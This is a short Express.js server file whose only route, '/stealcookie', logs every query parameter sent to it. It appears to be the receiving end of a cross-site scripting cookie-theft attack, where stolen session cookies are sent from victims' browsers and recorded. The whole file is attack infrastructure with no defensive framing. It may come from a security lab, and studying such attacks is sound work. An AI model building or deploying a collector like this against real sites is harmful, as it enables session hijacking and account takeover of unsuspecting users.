import express from "express";
import http from "http";

const PORT = process.env.PORT || 9090;
const HOSTNAME = process.env.BINDADDRESS || "0.0.0.0";

const app = express();

app.get("/stealcookie", (req, res) => {
    console.log(req.query);
    res.status(200).send();
});

const httpServer = http.createServer(app);

httpServer.listen(PORT, HOSTNAME, () => {
    console.log(`Backend - Running on port ${PORT}...`);
});
